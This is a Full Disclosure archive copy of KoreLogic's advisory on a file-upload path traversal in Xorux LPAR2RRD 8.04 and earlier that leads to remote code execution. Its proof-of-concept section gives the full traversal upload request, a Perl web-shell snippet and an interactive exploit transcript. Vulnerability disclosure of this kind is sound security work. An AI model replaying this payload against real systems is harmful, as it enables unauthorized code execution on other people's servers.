---
title: KL-001-2025-016: Xorux LPAR2RRD File Upload Directory Traversal
url: https://seclists.org/fulldisclosure/2025/Jul/19
source: Full Disclosure
date: 2025-07-29
fetch_date: 2025-10-07T00:09:43.331879
---

# KL-001-2025-016: Xorux LPAR2RRD File Upload Directory Traversal

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](20)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](20)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-016: Xorux LPAR2RRD File Upload Directory Traversal

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 28 Jul 2025 18:42:21 -0500

---

```
KL-001-2025-016: Xorux LPAR2RRD File Upload Directory Traversal

Title: Xorux LPAR2RRD File Upload Directory Traversal
Advisory ID: KL-001-2025-016
Publication Date: 2025-07-28
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-016.txt

1. Vulnerability Details

     Affected Vendor: Xorux
     Affected Product: LPAR2RRD
     Affected Version: 8.04 and prior
     Platform: Rocky Linux 8.10
     CWE Classification: CWE-24: Path Traversal: '../filedir',
                         CWE-434: Unrestricted Upload of File with
                         Dangerous Type, CWE-648: Incorrect Use of
                         Privileged APIs
     CVE ID: CVE-2025-54769

2. Vulnerability Description

     An authenticated, read-only user can upload a file and perform
     a directory traversal to have the uploaded file placed in a
     location of their choosing.  This can be used to overwrite
     existing PERL modules within the application to achieve remote
     code execution (RCE) by an attacker.

3. Technical Description

     The filename can be altered manually to direct on the local
     filesystem on the Xormon Original appliance the upgrade file
     should be placed. The Xormon appliance will recognize the
     file as not being a valid upgrade package, but still writes
     the file to the filesystem. This can be exploited to write
     a valid PERL script into the /home/lpar2rrd/lpar2rrd/bin/
     directory, where it can be called by existing scripts that
     are accessible via https://<IP>/lpar2rrd-cgi/<script> URL.

4. Mitigation and Remediation Recommendation

     Xorux released version 8.05, which includes a remediation
     for this vulnerability. See https://lpar2rrd.com/note800.php.

5. Credit

     This vulnerability was discovered by Jim Becher of KoreLogic,
     Inc.

6. Disclosure Timeline

     2025-07-17 : KoreLogic requests point-of-contact to securely
                  report several vulnerabilities to Xorux.
     2025-07-18 : Vendor provides support () xorux com as the
                  point-of-contact, noting that they do not use PGP.
     2025-07-21 : KoreLogic submits this vulnerability and four
                  additional discoveries to Xorux.
     2025-07-23 : Vendor acknowledges receipt, stating that the issue
                  has been remediated and a new version of the
                  affected product will be available 2025-07-25.
     2025-07-25 : Xorux publishes updated version of the affected
                  product.
     2025-07-28 : KoreLogic public disclosure.

7. Proof of Concept

     A simple proof of concept is to alter the users.pl script and
     add some additional logic which will perform the id command. The
     POST is performed using a read-only user, authenticated via
     Basic Auth.

         POST /lpar2rrd-cgi/upgrade.sh HTTP/1.1
         Host: 172.31.255.207
         Cookie: browserTZ=America%2FChicago
         User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
         Accept: */*
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate, br
         X-Requested-With: XMLHttpRequest
         Content-Type: multipart/form-data; boundary=----geckoformboundaryc85a7a0a8e67e32643575b13f47b175f
         Content-Length: 15057
         Origin: https://172.31.255.207
         Authorization: Basic amJlY2hlcjpqYmVjaGVy
         Referer: https://172.31.255.207/lpar2rrd/index.html?amenu=upgrade&tab=0
         Sec-Fetch-Dest: empty
         Sec-Fetch-Mode: cors
         Sec-Fetch-Site: same-origin
         Priority: u=0
         Te: trailers
         Connection: keep-alive

         ------geckoformboundaryc85a7a0a8e67e32643575b13f47b175f
         Content-Disposition: form-data; name="upgfile"; filename="../home/lpar2rrd/lpar2rrd/bin/users.pl"
         Content-Type: application/x-perl

         use strict;
         use warnings;
         use CGI::Carp qw(fatalsToBrowser);
         use Data::Dumper;
         ...
         [SNIPPED for brevity]
         # Kore
         elsif ( $PAR{cmd} eq "kore" ) {
           my $out;
           print "Content-type: text/html\n\n";
           $out = system("/usr/bin/id");
           print $out;

         }
         ...
         [SNIPPED for brevity]

     The response from the Xormon Original appliance is:

         HTTP/1.1 200 OK
         Date: Thu, 03 Apr 2025 00:37:18 GMT
         Server: Apache
         X-Frame-Options: SAMEORIGIN
         Keep-Alive: timeout=5, max=100
         Connection: Keep-Alive
         Content-Type: application/json
         Content-Length: 93

         { "success": false, "message" : "This file doesn't look like the upgrade package", "log": ""}

     But the file is still written to the filesystem. Subsequent
     calls to the https://<ip>/lpar2rrd-cgi/users.sh script with the
     cmd added return the output of the id command, as show below.

         GET /lpar2rrd-cgi/users.sh?cmd=kore HTTP/1.1
         Host: 172.31.255.207
         Cookie: browserTZ=America%2FChicago
         User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate, br
         Authorization: Basic amJlY2hlcjpqYmVjaGVy
         Upgrade-Insecure-Requests: 1
         Sec-Fetch-Dest: document
         Sec-Fetch-Mode: navigate
         Sec-Fetch-Site: none
         Sec-Fetch-User: ?1
         Priority: u=0, i
         Pragma: no-cache
         Cache-Control: no-cache
         Te: trailers
         Connection: keep-alive

         HTTP/1.1 200 OK
         Date: Thu, 03 Apr 2025 00:37:42 GMT
         Server: Apache
         X-Frame-Options: SAMEORIGIN
         Keep-Alive: timeout=5, max=100
         Connection: Keep-Alive
         Content-Type: text/html; charset=UTF-8
         Content-Length: 61

         uid=1005(lpar2rrd) gid=1005(lpar2rrd) groups=1005(lpar2rrd)
         0

     This can be expanded upon to create a full-fledged exploit.

         attacker $ python3 xormon-orig-readonly-rce.py
         >id
         uid=1005(lpar2rrd) gid=1005(lpar2rrd) groups=1005(lpar2rrd)
         0
         >netstat -an | grep LIST | head -10
         tcp        0      0 0.0.0.0:111 0.0.0.0:*               LISTEN
         tcp        0      0 0.0.0.0:22 0.0.0.0:*               LISTEN
         tcp        0      0 127.0.0.1:25 0.0.0.0:*               LISTEN
         tcp        0      0 0.0.0.0:8162 0.0.0.0:*               LISTEN
         tcp6       0      0 :::111 :::*                    LISTEN
         tcp6       0      0 :::80 :::*                    LISTEN
         tcp6       0      0 :::22 :::*                    LISTEN
         tcp6       0      0 ::1:25 :::*                    LISTEN
         tcp6       0      0 :::8443 :::*                    LISTEN
         tcp6       0      0 127.0.0.1:39931 :::*                    LISTEN
         0
         >ps -efww | grep "java"
...